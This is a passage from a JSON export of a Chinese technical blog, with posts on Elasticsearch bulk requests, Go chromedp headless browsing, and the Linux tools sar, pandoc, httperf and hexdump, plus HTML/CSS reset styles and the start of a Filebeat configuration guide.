{\"field2\" : \"value2\"} }\n在Url中设置默认的index和type\n\n如果在路径中设置了index或者type，那么在JSON中就不需要设置了。如果在JSON中设置，会覆盖掉路径中的配置。\n\n比如上面的例子中，文件中定义了索引为test,类型为type1；而我们在路径中定义了默认的选项，索引为test333,类型为type333。执行命令后，发现文件中的配置会覆盖掉路径中的配置。这样也提供了统一的默认配置以及个性化的特殊配置的需求。\n\n其他\n\n由于bulk是一次性提交很多的命令，它会把这些数据都发送到一个节点，然后这个节点解析元数据（index或者type或者id之类的），然后分发给其他的节点的分片，进行操作。\n\n由于很多命令执行后，统一的返回结果，因此数据量可能会比较大。这个时候如果使用的是chunk编码的方式，分段进行传输，可能会造成一定的延迟。因此还是对条件在客户端进行一定的缓冲，虽然bulk提供了批处理的方法，但是也不能给太大的压力！\n\n最后要说一点的是，Bulk中的操作执行成功与否是不影响其他的操作的。而且也没有具体的参数统计，一次bulk操作，有多少成功多少失败。\n\n扩展：在Logstash中，传输的机制其实就是bulk，只是他使用了Buffer,如果是服务器造成的访问延迟可能会采取重传，其他的失败就只丢弃了....","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang chromedp","title":"Go语言 chromedp","text":"\n\nwget -q -O - https://dl-ssl.google.com/linux/linuxsigningkey.pub | sudo apt-key add -\nsudo sh -c 'echo \"deb https://dl.google.com/linux/chrome/deb/ stable main\"     /etc/apt/sources.list.d/google.list'\nsudo apt-get update\nsudo apt-get install google-chrome-stable\n\nsudo add-apt-repository ppa:chromium-daily/stable\nsudo apt-get update\nsudo apt-get install chromium-browser\n\ngoogle-chrome --headless --remote-debugging-port=9222  --disable-gpu http://baidu.com\nubuntu上大多没有gpu，所以--disable-gpu\n测试 curl http://localhost:9222 能够看到调试信息应该就是装好了。\n docker run -it -p 9222:9222 --rm --name chrome-headless knqz/chrome-headless\n\n /usr/bin/google-chrome -  /etc/alternatives/google-chrome\n /etc/alternatives/google-chrome -  /usr/bin/google-chrome-stable\n /usr/bin/google-chrome-stable -  /opt/google/chrome/google-chrome\n\n注意事项\nPool 只能工作在 headlessshell 下,linux 默认是没有的，所以需要在docker headless模式下执行\nSendKeys is for input elements 不能对 div 元素使用\n 创建新实例 和 连接到已有的实例\nStarting a new instance of Chrome by invoking cdp.WithRunnerOptions resolves both of the issues detailed above:\n\nc, err := cdp.New(ctxt, cdp.WithRunnerOptions(\n\t   runner.Flag(\"headless\", true),\n\t   runner.Flag(\"disable-gpu\", true)))\n\nPreviously, I was using cdp.WithTargets to connect to an existing instance of Chrome:\n\nc, err := cdp.New(ctxt, cdp.WithTargets(client.New().WatchPageTargets(ctxt)))\n\ndocker\n docker run -it --rm -p=0.0.0.0:9222:9222 --name=chrome-headless -e \"CHROMEOPTS=--proxy-server=localhost:8080\" -v /tmp/chromedata/:/data norsknettarkiv/chrome-headless\n\n docker run -d -p 9222:9222 --rm --name chrome-headless knqz/chrome-headless\n\n 启动 handless模式\n\nc, err := cdp.New(ctxt, cdp.WithTargets(client.New().WatchPageTargets(ctxt)), cdp.WithLog(log.Printf))\n\n执行js脚本\nchromedp.Evaluate()\nuse the chromedp.Evaluate() action in conjuction with the chromedp/runner/Runner.\n Or use chromedp/cdp/runtime.Evaluate() with the frame handler.\n 最大化窗口\nc, err := cdp.New(ctxt, cdp.WithLog(log.Printf), cdp.WithRunnerOptions(\n\t\trunner.Flag(\"start-maximized\", true),\n\t))\n\n创建新的tab\nclient := cdpclient.New()\nt, err := client.NewPageTarget(ctx)\nif err != nil {\n    return err\n}\n\nh, err := cdp.NewTargetHandler(t, log.Printf, log.Printf, log.Printf)\nif err != nil {\n    return err\n}\n\nif err := h.Run(ctx); err != nil {\n    return err\n}\n 自定义chrome 路径\nctxt, cancel := context.WithCancel(context.Background())\ndefer cancel()\nc, err := chromedp.New(ctxt, chromedp.WithRunnerOptions(\n    runner.Path(\"/path/to/chrome\"),\n))\n\nctxt, cancel := context.WithCancel(context.Background())\n defer cancel()\n\n startload := time.Now()\n path := \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"\n if runtime.GOOS != \"windows\" {\n   path = \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"\n }   \n\n c, err := cdp.New(ctxt, cdp.WithRunnerOptions(\n  //  runner.Headless(\"/usr/bin/google-chrome\", port),\n   runner.Headless(path, 9222),\n   runner.Flag(\"headless\", true),\n   runner.Flag(\"disable-gpu\", true),\n   runner.Flag(\"no-first-run\", true),\n   runner.Flag(\"no-default-browser-check\", true),\n   runner.Flag(\"window-size\", \"800,420\"),\n   runner.Flag(\"hide-scrollbars\", \"true\"),\n   runner.Flag(\"start-maximized\", true),\n   runner.Flag(\"disable-web-security\", true),\n  //  runner.Flag(\"headless\", true),\n ))\n //\n if err != nil {\n   log.Fatal(err)\n }\n\nelapsedload := time.Since(startload)\n\n 开启代理\n// create chrome instance\n\tc, err := cdp.New(ctxt, cdp.WithRunnerOptions(runner.Proxy(\"127.0.0.1:1080\")))\n\tif err != nil {\n\t\tlog.Fatal(err)\n}\nc, err := chromedp.New(ctxt, chromedp.WithRunnerOptions(\n    runner.Proxy(http://localhost:8000/),\n))\nfunc NewBrowser(agent string, country string) Client {\n    var err error\n    var proxy Proxy\n    var chrome cdp.CDP\n\n    if country != \"\" {\n        proxy = ByCountry(country)\n    }\n\n    // Create Context\n    client := new(Client)\n    ctxt, cancel := context.WithCancel(context.Background())\n\n    // Create chrome instance\n    var proxyOption = runner.Proxy(fmt.Sprintf(\"%s://%s:%s@%s:%s\", proxy.Protocol, proxy.Credentials.User, proxy.Credentials.Password, proxy.Host, proxy.Port))\n    var agentOption = runner.UserAgent(agent)\n\n    if country == \"\" {\n        chrome, err = cdp.New(ctxt, cdp.WithLog(log.Printf), cdp.WithRunnerOptions(agentOption))  // For headless use cdp.WithRunnerOptions(runner.Flag(\"headless\", true) as third parameter\n    } else {\n        chrome, err = cdp.New(ctxt, cdp.WithRunnerOptions(agentOption, proxyOption))  // For headless use cdp.WithRunnerOptions(runner.Flag(\"headless\", true) as third parameter\n    }\n\n    if err != nil {\n        log.Fatal(err)\n    }\n\n    network.Enable()\n    network.SetRequestInterceptionEnabled(true)\n\n    client.Context = ctxt\n    client.Client = chrome\n    client.Cancel = cancel\n\n    return client\n}\n\n获取节点\n所有事件作用在第一个找到的元素\nvar nodes []cdptypes.Node\nt := chromedp.Tasks{\n\tchromedp.Navigate(https://godoc.org),\n\tchromedp.Sleep(time.Second * 2),\n\tchromedp.Nodes(ul[class=\"list-unstyled\"]   li   a, \u0026nodes, chromedp.ByQueryAll),\n}\n\nerr = c.Run(ctx, t)\nif err != nil {\n\tlog.Fatal(err)\n}\n\nfor , n := range nodes {\n\tfmt.Printf(\"got package: %s \\n\", n.AttributeValue(\"href\"))\n}\n`","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux监控命令 sar","title":"Linux监控命令 sar","text":"sar 是Linux系统下的监控命令\n\n安装sar：\n1\nyum install -y sysstat\n第一次使用sar命令会报如下错误：“无法打开 /var/log/sa/sa17: 没有那个文件或目录”。\n这里的值17一般是当天的日期（我在2015年8月17日测试，所以这里是17）。这个错误是由于没有创建那个文件，可是使用参数-o 让其生成。\n\nsar -o 17\n这样/var/log/sysstat/目录下就会有文件了。\n\n1、sar -n DEV 查看网卡流量\n\nsar -n DEV 1 5  ## 1秒显示一次，总共显示5次\n\nsar -n DEV -f /var/log/sa/sa17  ## -f选项查看有一天的网卡流量历史，后面跟某天对应的文件名\n2、sar -q  查看历史负载\n3、sar -b  查看磁盘\n\n-n参数很有用，他有6个不同的开关：DEV | EDEV | NFS | NFSD | SOCK | ALL 。\nDEV显示网络接口信息，\nEDEV显示关于网络错误的统计数据，\nNFS统计活动的NFS客户端的信息，\nNFSD统计NFS服务器的信息，\nSOCK显示套 接字信息，\nALL显示所有5个开关。\n\n它们可以单独或者一起使用。我们现在要用的就是-n DEV了。\n\n输入命令：sar –n DEV 1 4\n\n命令后面 1 4 意思是：每一秒钟取一次值，取四次。\n\nIFACE：LAN接口\nrxpck/s：每秒钟接收的数据包\ntxpck/s：每秒钟发送的数据包\nrxbyt/s：每秒钟接收的字节数\ntxbyt/s：每秒钟发送的字节数\nrxcmp/s：每秒钟接收的压缩数据包\ntxcmp/s：每秒钟发送的压缩数据包\nrxmcst/s：每秒钟接收的多播数据包\n\nIFACE：LAN接口\nrxerr/s：每秒钟接收的坏数据包\ntxerr/s：每秒钟发送的坏数据包\n\ncoll/s：每秒冲突数\nrxdrop/s：因为缓冲充满，每秒钟丢弃的已接收数据包数\ntxdrop/s：因为缓冲充满，每秒钟丢弃的已发送数据包数\ntxcarr/s：发送数据包时，每秒载波错误数\nrxfram/s：每秒接收数据包的帧对齐错误数\nrxfifo/s：接收的数据包每秒FIFO过速的错误数\ntxfifo/s：发送的数据包每秒FIFO过速的错误数\n\n下面几个更简单的方法，虽然可以看到流量的统计信息，但是太简单，而且也不直观。\n\n命令：\n[root@station204 ~]# watch ifconfig\n\n另外还有iftop，RHEL5不自带，我用了下，不喜欢用。\niftop\n[root@station204 ~]# watch more /proc/net/dev\n\nlinux sar命令详解\n\nsar（System Activity Reporter系统活动情况报告）是目前 Linux 上最为全面的系统性能分析工具之一，可以从多方面对系统的活动进行报告，包括：文件的读写情况、系统调用的使用情况、磁盘I/O、CPU效率、内存使用状况、进程活动及IPC有关的活动等。本文主要以CentOS 6.3 x64系统为例，介绍sar命令。\n\nsar命令常用格式\n\nsar [options] [-A] [-o file] t [n]\n\n其中：\n\nt为采样间隔，n为采样次数，默认值是1；\n\n-o file表示将命令结果以二进制格式存放在文件中，file 是文件名。\n\noptions 为命令行选项，sar命令常用选项如下：\n\n-A：所有报告的总和\n\n-u：输出CPU使用情况的统计信息\n\n-v：输出inode、文件和其他内核表的统计信息\n\n-d：输出每一个块设备的活动信息\n\n-r：输出内存和交换空间的统计信息\n\n-b：显示I/O和传送速率的统计信息\n\n-a：文件读写情况\n\n-c：输出进程统计信息，每秒创建的进程数\n\n-R：输出内存页面的统计信息\n\n-y：终端设备活动情况\n\n-w：输出系统交换活动信息\n\nCPU资源监控\n\n例如，每10秒采样一次，连续采样3次，观察CPU 的使用情况，并将采样结果以二进制形式存入当前目录下的文件test中，需键入如下命令：\n\nsar -u -o test 10 3\n\n屏幕显示如下：\n\n17:06:16 CPU %user %nice %system %iowait %steal %idle\n\n17:06:26 all 0.00 0.00 0.20 0.00 0.00 99.80\n\n17:06:36 all 0.00 0.00 0.20 0.00 0.00 99.80\n\n17:06:46 all 0.00 0.00 0.10 0.00 0.00 99.90\n\nAverage: all 0.00 0.00 0.17 0.00 0.00 99.83\n\n输出项说明：\n\nCPU：all 表示统计信息为所有 CPU 的平均值。\n\n%user：显示在用户级别(application)运行使用 CPU 总时间的百分比。\n\n%nice：显示在用户级别，用于nice操作，所占用 CPU 总时间的百分比。\n\n%system：在核心级别(kernel)运行所使用 CPU 总时间的百分比。\n\n%iowait：显示用于等待I/O操作占用 CPU 总时间的百分比。\n\n%steal：管理程序(hypervisor)为另一个虚拟进程提供服务而等待虚拟 CPU 的百分比。\n\n%idle：显示 CPU 空闲时间占用 CPU 总时间的百分比。\n\n若 %iowait 的值过高，表示硬盘存在I/O瓶颈\n\n若 %idle 的值高但系统响应慢时，有可能是 CPU 等待分配内存，此时应加大内存容量\n\n若 %idle 的值持续低于1，则系统的 CPU 处理能力相对较低，表明系统中最需要解决的资源是 CPU 。\n\n如果要查看二进制文件test中的内容，需键入如下sar命令：\n\nsar -u -f test\n\ninode、文件和其他内核表监控\n\n例如，每10秒采样一次，连续采样3次，观察核心表的状态，需键入如下命令：\n\nsar -v 10 3\n\n屏幕显示如下：\n\n17:10:49 dentunusd file-nr inode-nr pty-nr\n\n17:10:59 6301 5664 12037 4\n\n17:11:09 6301 5664 12037 4\n\n17:11:19 6301 5664 12037 4\n\nAverage: 6301 5664 12037 4\n\n输出项说明：\n\ndentunusd：目录高速缓存中未被使用的条目数量\n\nfile-nr：文件句柄（file handle）的使用数量\n\ninode-nr：索引节点句柄（inode handle）的使用数量\n\npty-nr：使用的pty数量\n\n内存和交换空间监控\n\n例如，每10秒采样一次，连续采样3次，监控内存分页：\n\nsar -r 10 3\n\n屏幕显示如下：\n\n输出项说明：\n\nkbmemfree：这个值和free命令中的free值基本一致,所以它不包括buffer和cache的空间.\n\nkbmemused：这个值和free命令中的used值基本一致,所以它包括buffer和cache的空间.\n\n%memused：这个值是kbmemused和内存总量(不包括swap)的一个百分比.\n\nkbbuffers和kbcached：这两个值就是free命令中的buffer和cache.\n\nkbcommit：保证当前系统所需要的内存,即为了确保不溢出而需要的内存(RAM+swap).\n\n%commit：这个值是kbcommit与内存总量(包括swap)的一个百分比.\n\n内存分页监控\n\n例如，每10秒采样一次，连续采样3次，监控内存分页：\n\nsar -B 10 3\n\n屏幕显示如下：\n\n输出项说明：\n\npgpgin/s：表示每秒从磁盘或SWAP置换到内存的字节数(KB)\n\npgpgout/s：表示每秒从内存置换到磁盘或SWAP的字节数(KB)\n\nfault/s：每秒钟系统产生的缺页数,即主缺页与次缺页之和(major + minor)\n\nmajflt/s：每秒钟产生的主缺页数.\n\npgfree/s：每秒被放入空闲队列中的页个数\n\npgscank/s：每秒被kswapd扫描的页个数\n\npgscand/s：每秒直接被扫描的页个数\n\npgsteal/s：每秒钟从cache中被清除来满足内存需要的页个数\n\n%vmeff：每秒清除的页(pgsteal)占总扫描页(pgscank+pgscand)的百分比\n\nI/O和传送速率监控\n\n例如，每10秒采样一次，连续采样3次，报告缓冲区的使用情况，需键入如下命令：\n\nsar -b 10 3\n\n屏幕显示如下：\n\n18:51:05 tps rtps wtps bread/s bwrtn/s\n\n18:51:15 0.00 0.00 0.00 0.00 0.00\n\n18:51:25 1.92 0.00 1.92 0.00 22.65\n\n18:51:35 0.00 0.00 0.00 0.00 0.00\n\nAverage: 0.64 0.00 0.64 0.00 7.59\n\n输出项说明：\n\ntps：每秒钟物理设备的 I/O 传输总量\n\nrtps：每秒钟从物理设备读入的数据总量\n\nwtps：每秒钟向物理设备写入的数据总量\n\nbread/s：每秒钟从物理设备读入的数据量，单位为 块/s\n\nbwrtn/s：每秒钟向物理设备写入的数据量，单位为 块/s\n\n进程队列长度和平均负载状态监控\n\n例如，每10秒采样一次，连续采样3次，监控进程队列长度和平均负载状态：\n\nsar -q 10 3\n\n屏幕显示如下：\n\n19:25:50 runq-sz plist-sz ldavg-1 ldavg-5 ldavg-15\n\n19:26:00 0 259 0.00 0.00 0.00\n\n19:26:10 0 259 0.00 0.00 0.00\n\n19:26:20 0 259 0.00 0.00 0.00\n\nAverage: 0 259 0.00 0.00 0.00\n\n输出项说明：\n\nrunq-sz：运行队列的长度（等待运行的进程数）\n\nplist-sz：进程列表中进程（processes）和线程（threads）的数量\n\nldavg-1：最后1分钟的系统平均负载（System load average）\n\nldavg-5：过去5分钟的系统平均负载\n\nldavg-15：过去15分钟的系统平均负载\n\n系统交换活动信息监控\n\n例如，每10秒采样一次，连续采样3次，监控系统交换活动信息：\n\nsar -    W 10 3\n\n屏幕显示如下：\n\n19:39:50 pswpin/s pswpout/s\n\n19:40:00 0.00 0.00\n\n19:40:10 0.00 0.00\n\n19:40:20 0.00 0.00\n\nAverage: 0.00 0.00\n\n输出项说明：\n\npswpin/s：每秒系统换入的交换页面（swap page）数量\n\npswpout/s：每秒系统换出的交换页面（swap page）数量\n\n设备使用情况监控\n\n例如，每10秒采样一次，连续采样3次，报告设备使用情况，需键入如下命令：\n\nsar -d 10 3 –p\n\n屏幕显示如下：\n\n17:45:54    DEV    tps    rdsec/s    wrsec/s    avgrq-sz    avgqu-sz    await    svctm    %util\n\n17:46:04    scd0    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00\n\n17:46:04    sda    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00\n\n17:46:04    vglivedvd-lvroot    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00\n\n17:46:04    vglivedvd-lvswap    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00\n\n其中：\n\n参数-p可以打印出sda,hdc等磁盘设备名称,如果不用参数-p,设备节点则有可能是dev8-0,dev22-0\n\ntps:每秒从物理磁盘I/O的次数.多个逻辑请求会被合并为一个I/O磁盘请求,一次传输的大小是不确定的.\n\nrdsec/s:每秒读扇区的次数.\n\nwrsec/s:每秒写扇区的次数.\n\navgrq-sz:平均每次设备I/O操作的数据大小(扇区).\n\navgqu-sz:磁盘请求队列的平均长度.\n\nawait:从请求磁盘操作到系统完成处理,每次请求的平均消耗时间,包括请求队列等待时间,单位是毫秒(1秒=1000毫秒).\n\nsvctm:系统处理每次请求的平均时间,不包括在请求队列中消耗的时间.\n\n%util:I/O请求占CPU的百分比,比率越大,说明越饱和.\n\navgqu-sz 的值较低时，设备的利用率较高。\n\n当%util的值接近 1% 时，表示设备带宽已经占满。\n\n要判断系统瓶颈问题，有时需几个 sar 命令选项结合起来\n\n怀疑CPU存在瓶颈，可用 sar -u 和 sar -q 等来查看\n\n怀疑内存存在瓶颈，可用 sar -B、sar -r 和 sar -W 等来查看\n\n怀疑I/O存在瓶颈，可用 sar -b、sar -u 和 sar -d 等来查看","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 pandoc","title":"Linux命令 pandoc","text":"---\npandoc源码\nMMD语法参考\n官方参考文档\nPandoc Markdown\nPandoc中的Markdown语法\n#####################################\n\neval \"$(pandoc --bash-completion)\" #  \n\npandoc --list-extensions # 查看支持的Extension\npandoc --list-highlight-styles # 查看支持的语法高亮样式\npandoc --list-input-formats\npandoc --list-output-formats\n\npandoc -t markdowngithub+pipetables url -o file.md                 #增加markdown +表格转换\n\npandoc -t markdown+implicitfigures+linkattributes url -o file.md   #增加图片解析 + 表格解析\n\npandoc -t markdown-markdowninhtmlblocks url -o file.md            #移除多余的html标识div等 +表格解析\n\nfind ./posts -name '*.md' -exec pandoc {} -s -S --toc -o {}.html \\;  # markdown 转 html\n\ncurl -s http://www.xker.com/page/e2012/0926/120758.html | iconv -f gb2312 -t utf-8 | pandoc -f html -o iptables常用规则.md -t markdowngithub+autoidentifiers #中文编码gb2312\ncurl -s http://freeloda.blog.51cto.com/2033581/1241545 | iconv -f gbk -t utf-8 | pandoc -f html -o iptables详解及7层过滤.md -t markdowngithub+autoidentifiers #gbk编码\npandoc -f html -t markdown http://www.fsf.org\n    -f参数用于指定源文件格式\n    -t参数用于指定输出文件格式\n    -o参数用于指定输出文件    \n    -s, --standalone  #不输出header and footer 信息  \n\ndocker run jagregory/pandoc\n参数 Markdown\nhttp://www.bagualu.net/wordpress/archives/5284pandoc-%E6%89%A9%E5%B1%95%E6%A0%87%E9%A2%98%E5%89%8D%E7%A9%BA%E8%A1%8C-blankbeforeheader\nMarkdown variants","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 压力测试httperf","title":"Linux命令 httperf","text":"一、工具下载\u0026\u0026安装\n软件获取\n\nftp://ftp.hpl.hp.com/pub/httperf/\n这里使用的是如下的版本\nftp://ftp.hpl.hp.com/pub/httperf/httperf-0.9.0.tar.gz\n软件安装\nls httperf-0.9.0.tar.gz  \nhttperf-0.9.0.tar.gz\ntar zxvf httperf-0.9.0.tar.gz  \u0026\u0026 cd httperf-0.9.0 \u0026\u0026./configure  --prefix=/usr/local/tools \u0026\u0026 make \u0026\u0026 make install\n\n二、开始压力测试\n\n[root@localhost bin]# ./httperf --client=0/1 --server www.ethnicity.cn --port80 --uri /index.html --rate 100 --num-conn 300 --num-call 5 --timeout 5\n\n--client=I/N 指定当前客户端I，是N个客户端中的第几个。用于多个客户端发请求，希望确保每个客户端发的请求不是完全一致。一般不用指定\n\n--server 所测试的的网站名（主机名，域名或者ip地址）\n\n--uri 指定的下载文件\n\n--rate  每秒发送的请求\n\n--num-conn 连接的总数\n\n--num-call 每个连接发送的请求数目\n\n--timeout 超时时间\n\nhttperf --timeout=5 --client=0/1--server=www.ethnicity.cn --port=80 --uri=/index.html --rate=100 --send-buffer=4096--recv-buffer=16384 --num-conns=300 --num-calls=5\nMaximum connect burst length: 13\n\n最大并发连接数：13\n\nTotal: connections 300 requests 1475 replies 1475test-duration 6.204 s\n\n一共300个连接，1475个请求，应答了1475个，测试耗时：6.204秒\n\nConnection rate: 48.4 conn/s (20.7 ms/conn, \u003c=189concurrent connections)\n\n连接速率：48.4个每秒（每个连接耗时20.7 ms, 小于指定的300个并发连接）\n\nConnection time [ms]: min 663.4 avg 1937.6 max 3808.4median 1720.5 stddev 964.7\n\n连接时间（微秒）：最小663.4，平均1937.6，最大3808.4，中位数 1720.5， 标准偏差964.7\n\nConnection time [ms]: connect 1098.4\n\n连接时间（微秒）：连接1098.4\n\nConnection length [replies/conn]: 5.000\n\n连接长度（应答/连接）：5.000\n\nRequest rate: 237.7 req/s (4.2 ms/req)\n\n请求速率：237.7(pqs)，每个请求4.2 ms\n\nRequest size : 79.0\n\n连接长度（应答/连接）： 79.0\n\nReply rate [replies/s]: min 268.8 avg 268.8 max 268.8stddev 0.0 (1 samples)\n\n响应速率（响应个数/秒）：最小268.8， 平均268.8，最大268.8，标准偏差 0.0（一个例样）\n\nReply time [ms]: response 80.7 transfer 87.2\n\n响应时间（微妙）：响应80.7，传输87.2\n\nReply size : header 283.0 content 21895.0 footer 0.0(total 22178.0)\n\n应包长度（字节）：响应头283.0 内容：21895.0 响应末端 -0.0（总共22178.0）\n\nReply status: 1xx=0 2xx=1475 3xx=0 4xx=0 5xx=0\n\n响应包状态： 2xx 有1475个，其他没有\n\nCPU time [s]: user 0.45 system 5.48 (user 7.3% system88.3% total 95.6%)\n\nCPU时间（秒）: 用户0.45 系统5.48（用户占了7.3% 系统占88.3% 总共95.6%）\n\nNet I/O: 5167.4 KB/s (42.3*10^6 bps)\n\n网络I/O：5167.4 KB/s\n\nErrors: total 5 client-timo 5 socket-timo 0 connrefused 0connreset 0\n\n错误：总数5 客户端超时5 套接字超时0 连接拒绝0 连接重置0\n\nErrors: fd-unavail 0 addrunavail 0 ftab-full 0 other 0\n\n错误：fd不正确0 地址不正确0 ftab占满0其他0","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 hexdump","title":"Linux命令 hexdump","text":"hexdump - ”十六“进制查看器 - Bash @ Linux - ITeye技术网站\n单字节方式显示且不要省略\nhexdump -Cv 1.jpg\n\n示例一 比较各种参数的输出结果\n[root@new55 ~] echo /etc/passwd | hexdump\n0000000 652f 6374 702f 7361 7773 0a64          \n000000c\n[root@new55 ~]# echo /etc/passwd | od -x\n0000000 652f 6374 702f 7361 7773 0a64\n0000014\n[root@new55 ~]# echo /etc/passwd | xxd\n0000000: 2f65 7463 2f70 6173 7377 640a            /etc/passwd.\n[root@new55 ~]# echo /etc/passwd | hexdump -C      \u003c== 规范的十六进制和ASCII码显示（Canonical hex+ASCII display ）\n00000000  2f 65 74 63 2f 70 61 73  73 77 64 0a              |/etc/passwd.|\n0000000c\n[root@new55 ~]# echo /etc/passwd | hexdump -b      \u003c== 单字节八进制显示（One-byte octal display）\n0000000 057 145 164 143 057 160 141 163 163 167 144 012                \n000000c\n[root@new55 ~]# echo /etc/passwd | hexdump -c      \u003c== 单字节字符显示（One-byte character display）\n0000000   /   e   t   c   /   p   a   s   s   w   d  \\n                \n000000c\n[root@new55 ~]# echo /etc/passwd | hexdump -d      \u003c== 双字节十进制显示（Two-byte decimal display）\n0000000   25903   25460   28719   29537   30579   02660                \n000000c\n[root@new55 ~]# echo /etc/passwd | hexdump -o       \u003c== 双字节八进制显示（Two-byte octal display）\n0000000  062457  061564  070057  071541  073563  005144                \n000000c\n[root@new55 ~]# echo /etc/passwd | hexdump -x       \u003c== 双字节十六进制显示（Two-byte hexadecimal display）\n0000000    652f    6374    702f    7361    7773    0a64                \n000000c\n[root@new55 ~]# echo /etc/passwd | hexdump -v\n0000000 652f 6374 702f 7361 7773 0a64          \n000000c\n\n比较来比较去，还是hexdump -C的显示效果更好些。\n示例二 确认文本文件的格式\n文本文件在不同操作系统上的行结束标志是不一样的，经常会碰到由此带来的问题。比如Linux的许多命令不能很好的处理DOS格式的文本文件。Windows/DOS下的文本文件是以\\r\\n作为行结束的，而Linux/Unix下的文本文件是以\\n作为行结束的。\n\n[root@new55 ~]# cat test.bc\n123321\n123/321\nscale=4;123/321\n\n[root@new55 ~]# hexdump -C test.bc\n00000000  31 32 33 2a 33 32 31 0a   31 32 33 2f 33 32 31 0a  |123321.123/321.|\n00000010  73 63 61 6c 65 3d 34 3b  31 32 33 2f 33 32 31 0a  |scale=4;123/321.|\n00000020  0a                                                |.|\n00000021\n[root@new55 ~]#\n\n注：常见的ASCII字符的十六进制表示\n\\r      0D\n\\n      0A\n\\t      09\nDOS/Windows的换行符 \\r\\n 即十六进制表示 0D 0A\nLinux/Unix的换行符      \\n    即十六进制表示 0A\n\n示例三 查看wav文件\n有些IVR系统需要8K赫兹8比特的语音文件，可以使用hexdump看一下具体字节编码。\n[root@web186 root]# ls -l tmp.wav\n-rw-r--r--    1 root     root        32381 2010-04-19  tmp.wav\n[root@web186 root]# file tmp.wav\ntmp.wav: RIFF (little-endian) data, WAVE audio, ITU G.711 a-law, mono 8000 Hz\n[root@web186 root]# hexdump -C tmp.wav | less","tags":null},{"location":"//blog.pytool.com/Post/前端技术/2016-11-09 html","title":"html","text":"HTML5 元素\n\n模板引擎\n\n逼格最高显然是Jade\n\n但改名为Pug（哈巴狗）后\n\n就像是小龙女被尹志平不可描述后\n\n再也无爱了\n\n从此以后\n\n留了胡子（Mustache）\n\n扶着把手（Handlebars）\n\n对 HTML 的设置\n\n    !DOCTYPE html 设置正确的浏览器渲染模式\n    html lang=\"zh-cmn-Hans\" 设置页面内容的语言为简体中文；html lang=\"zh-cmn-Hant\" 为繁体中文；html lang=\"en\" 为英文。这么写的原因\n    meta charset=\"UTF-8\" 设置编码格式为 UTF-8\n    meta name=\"format-detection\" content=\"telephone=no\" / 当该 HTML 页面在手机上浏览时，该标签用于指定是否将网页内容中的手机号码显示为拨号的超链接，iPhone 上默认 telephone 设置为 yes\n    meta name=\"format-detection\" content=\"email=no\" / 忽略 Android 平台中对邮箱地址的识别\n    meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" 详情使用参考 MDN-在移动浏览器中使用 viewport 元标签控制布局\n    link rel=\"icon\" href=\"*/.*\" / 设置 icon\n\n浏览器重置样式设置\n\nreset.css\n\n1.可重置点击链接时出现的高亮颜色及 outline\n\n        {\n          outline: 0;\n          -webkit-tap-highlight-color: transparent;\n        }\n\n参考 -webkit-tap-highlight-color\n\n2.text-size-adjust\n\n        html {\n          -webkit-text-size-adjust: 100%;\n          -moz-text-size-adjust: 100%;\n          -ms-text-size-adjust: 100%;\n        }\n\n参考 text-size-adjust\n\n3.大屏幕下 body 水平居中\n\n        body {\n          margin: 0 auto;\n          padding: 0;\n          max-width: 540px;\n        }\n\n4.设置图片无法被选中\n\n        img {\n          -webkit-user-select: none;\n          -moz-user-select: none;\n          -ms-user-select: none;\n        }\n\n参考 user-select\n公有样式设置\n\nstyle.css\n\n1.使用面向属性的 CSS\n\n        .fs12 {\n          font-size: 12px;\n        }\n        .fs14 {\n          font-size: 14px;\n        }\n        .fw200 {\n          font-weight: 200;\n        }\n        .fw600 {\n          font-weight: 600;\n        }\n\n2.clearfix 清除浮动\n\n        .clearfix {\n          zoom: 1;\n        }\n        .clearfix:after {\n          content: \"\";\n          display: block;\n          height: 0;\n          visibility: hidden;\n          clear: both;\n        }\n\n3.0.5px 边框实现\n\n        .bd05 {\n          position: relative;\n        }\n        .bd05:before {\n          content: '';\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 200%;\n          height: 200%;\n          box-sizing: border-box;\n          border: 1px solid transparent;\n          transform-origin: left top;\n          transform: scale(0.5);\n          z-index: -1;\n        }\n\n4.遮罩层样式\n\n        .shade {\n          display: none;\n          position: absolute;\n          top: 0;\n          left: 0;\n          min-width: 100%;\n          min-height:100%;\n          background: rgba(0, 0, 0, 0.7);\n          z-index: 800;\n        }\n\n5.人民币符号\n\n        .rmb:before {\n          content: '￥';\n          vertical-align: baseline;\n        }\n\n集成手淘 rem 方案\n\n    可伸缩布局方案\n    使用 Flexible 实现手淘 H5 页面的终端适配\n    flexible.js 源码\n\n阅读源码可以知道，如果我们设置了 viewport 元数据，那么 dpr = 1 / scale；如果手动设置 flexible，则 dpr 取决于设置值；如果两者都不设置，那么 flexible.js 会根据 IOS/Android 平台去动态生成 meta 标签并设置 dpr（此时 dpr 值可能为 1~3）及缩放比例。\n\n建议使用修改源码后的 rem.js，设置 viewport 视口，在锁定缩放比例的同时，还可以使用 html data-dpr=\"1~3\" 提供的 class 过滤功能。","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 Elastic filebeat配置详解","title":"filebeat配置详解","text":"Registry File\n\nRegistry File存储了Filbeat最后一次读的位置和状态。在Logstash-Forwarder被称为.logstash-fowarder(位于/var/lib/logstash-forwarder/.logstash-forwarder)。对于Filebeat需要将其重命名为 .filebeat。\n迁移配置文件\n\n在Filebeat安装完成准备使用前，最好先对Filebeat进行一些详细的配置再使用，下面来详细讲解一下相关内容。\n\nFilebeat的配置文件是/etc/filebeat/filebeat.yml，遵循YAML语法。具体可以配置如下几个项目：\n\n    Filebeat\n    Output\n    Shipper\n    Logging(可选)\n    Run Options（可选）\n\n这个Blog主要讲解Filebeat的配置部分，其他部分后续会有新的Blog介绍。\n\nFilebeat的部分主要定义prospector的列表，定义监控哪里的日志文件，关于如何定义的详细信息可以参考filebeat.yml中的注释，下面主要介绍一些需要注意的地方。\n\n    